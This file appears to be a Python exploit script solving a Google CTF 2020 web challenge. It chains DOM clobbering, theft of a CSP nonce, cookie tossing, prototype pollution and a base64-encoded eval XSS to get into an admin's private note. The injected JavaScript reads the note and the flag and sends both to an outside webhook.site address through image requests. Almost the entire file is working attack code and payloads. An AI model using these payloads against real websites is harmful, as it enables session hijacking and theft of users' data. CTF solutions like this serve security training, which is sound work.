#!/usr/bin/env python3
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests, json, os, re, time, sys
from base64 import b64decode, b64encode
from flask import Flask
   
s = requests.Session()

chall_url = os.environ.get('CHALL_URL') or 'http://private.littlethings.challenge'
exploit_url = os.environ.get('EXP_URL') or 'https://webhook.site/edf729ac-8769-4c54-881f-f6545b1eda21'
pub_url = os.environ.get("PUB_URL") or 'https://pasteurize-vwatzbndzbawnsfs.web.ctfcompetition.com'

def u(path):
    return chall_url + path

def up(path):
    return pub_url + path

def parse_sess():
    return json.loads(b64decode(s.cookies['session']))

def get_cookies():
    return s.cookies['session'], s.cookies['session.sig']

def login():
    s.get(u('/login'))
    s.post(u('/login'), data={
        'csrf': parse_sess()['csrf'],
        'username': 'terjanq',
        'img' : '123',
        'script-choice': 1
    }, allow_redirects=False)
    return parse_sess()

def add_note(note, v="private"):
    r = s.post(u('/note'), data={
        'csrf': parse_sess()['csrf'],
        'content': note,
        'visibility': v,
    }, allow_redirects=True)
    notes = re.findall(r'/note/([^"]+)"', r.text)
    print(notes, file=sys.stderr)
    return notes[-1]

def add_public_note(xss):
    r = s.post(pub_url, data={
        'content[%s]' % xss: 'hehe',
    }, allow_redirects=False)
    note_id = r.headers['location'][1:]
    print('public note: %s' % note_id, file=sys.stderr)
    return note_id

XSS = (r'''
const top_domain = document.domain.split('.').slice(1).join('.');
const sleep = d => new Promise(r => setTimeout(r, d));
const exp_url = '%s';
setTimeout(()=>{
    fetch('/note').then(e => e.text()).then(receive_note);
},1000);

new Image().src=`${exp_url}/?c=admin`;

function clear_cookies() {
    document.cookie = `session=;Domain=.${top_domain};Path=/note/;Expires=Thu, 01 Jan 1970 00:00:01 GMT;`
    document.cookie = `session.sig=;Domain=.${top_domain};Path=/note/;Expires=Thu, 01 Jan 1970 00:00:01 GMT;`
}

async function receive_note(msg) {
    let re = /<a href="\/note\/([^"]+)"/
    let flag_id = re.exec(msg)[1];

    clear_cookies();
    await sleep(100)

    fetch('/note/' + flag_id).then(e => e.text()).then(receive_flag);
}

async function receive_flag(msg) {
    console.log(msg);
    new Image().src=`${exp_url}/?c=`.concat(encodeURIComponent(msg));
    let re = /const note = "([^"]+)/
    console.log(re.exec(msg));
    let flag = re.exec(msg)[1];
    new Image().src=(`${exp_url}/?f=`.concat(flag));
}
''' % exploit_url)

NOTE = r'''
<a id=theme name=cb href="cid:_=document.body.firstElementChild.innerHTML=p.title.toString"></a>
<i id=theme>
<i id=p title='
<iframe name="iframe" srcdoc="<script id=script></script>"></iframe>
<iframe srcdoc="
    <script src=/theme?cb=top.iframe.script.nonce=top.document.body.lastElementChild.nonce.toString></script>
"></iframe>
<iframe srcdoc="
    <a id=p title=&apos;%s&apos;>
    <script src=/theme?cb=top.iframe.script.innerHTML=p.title.toString></script>
"></iframe>
'>
''' % XSS.replace("'", "&#x26;#x26;apos;").replace("\"", "&#x26;#x26;quot;")

login()
time.sleep(0.5)
n3 = add_note(NOTE, 'private')

sess, sess_sig = get_cookies()

XSS_SIMPLE = '''

const chall_url = "%s";
const top_domain = document.domain.split('.').slice(1).join('.');
const session = "%s";
const session_sig = "%s";
const note_id = "%s";
const sleep = d => new Promise(r=>setTimeout(r,d));


(async ()=>{
    document.cookie = `session=${session};Path=/note/;Domain=.${top_domain}`;
    document.cookie = `session.sig=${session_sig};Path=/note/;Domain=.${top_domain}`;

    window.name='{"__proto__":["all"], "debugUser":1}';

    await sleep(1000);
    location = `${chall_url}/note/${note_id}?__debug__`
})();

''' % (chall_url, sess, sess_sig, n3) 

NOTE_PUBLIC = '''
<img x="/><img src=x: onerror='eval(atob(&quot;%s&quot;))'>" y="<x">
''' % b64encode(XSS_SIMPLE.encode()).decode()

NOTE_PUBLIC_XSS = ''';eval(atob('%s'))//''' % b64encode(XSS_SIMPLE.encode()).decode()

time.sleep(0.5)
note = add_public_note(NOTE_PUBLIC_XSS)

print("%s/%s" % (pub_url, note))
 